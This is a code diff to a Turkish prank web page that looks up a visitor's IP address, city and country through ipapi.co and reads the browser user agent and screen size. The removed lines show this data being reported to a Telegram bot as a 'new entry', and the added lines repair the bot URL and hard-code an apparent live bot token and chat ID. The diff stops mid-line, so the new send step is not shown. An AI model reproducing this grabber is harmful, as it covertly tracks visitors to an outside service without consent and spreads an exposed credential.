@@ -1,4 +1,4 @@
-8<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
@@ -17,6 +17,8 @@
       white-space: pre-line;
       height: 100vh;
       overflow-y: auto;
+      position: relative;
+      z-index: 1;
     }
     .background-code {
       position: fixed;
@@ -44,6 +46,8 @@
       border: none;
       cursor: pointer;
       font-family: 'Courier New', monospace;
+      position: relative;
+      z-index: 2;
     }
   </style>
 </head>
@@ -82,9 +86,10 @@
     }
 
     async function sendToTelegram(message) {
-      const chatId = "8059389140";  // kendi chat ID’n
-      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg";
-      const url = `6400737507`;
+      const chatId = "6400737507";  // Chat ID (örnek: 123456789)
+      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Bot Token (örnek: 123456:ABC...XYZ)
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
       await fetch(url, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
@@ -99,29 +104,14 @@
       await typeText("Veriler toplanıyor...");
       await new Promise(r => setTimeout(r, 1000));
 
-      const res = await fetch('https://ipapi.co/json/');
-      const data = await res.json();
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
 
-      await typeText(`IP Adresi: ${data.ip}`);
-      await typeText(`Şehir: ${data.city}`);
-      await typeText(`Ülke: ${data.country_name}`);
-      await typeText(`Tarayıcı: ${navigator.userAgent}`);
-      await typeText(`Ekran: ${screen.width}x${screen.height}`);
+        await typeText(`IP Adresi: ${data.ip}`);
+        await typeText(`Şehir: ${data.city}`);
+        await typeText(`Ülke: ${data.country_name}`);
+        await typeText(`Tarayıcı: ${navigator.userAgent}`);
+        await typeText(`Ekran: ${screen.width}x${screen.height}`);
 
-      const message = `YENİ GİRİŞ:
-IP: ${data.ip}
-Şehir: ${data.city}
-Ülke: ${data.country_name}
-Tarayıcı: ${navigator.userAgent}
-Çözünürlük: ${screen.width}x${screen.height}`;
-      
-      await sendToTelegram(message);
-
-      await new Promise(r => setTimeout(r, 1000));
-      rickButton.style.display = 'block';
-    }
-
-    showInfo();
-  </script>
-</body>
-</html>
+        const
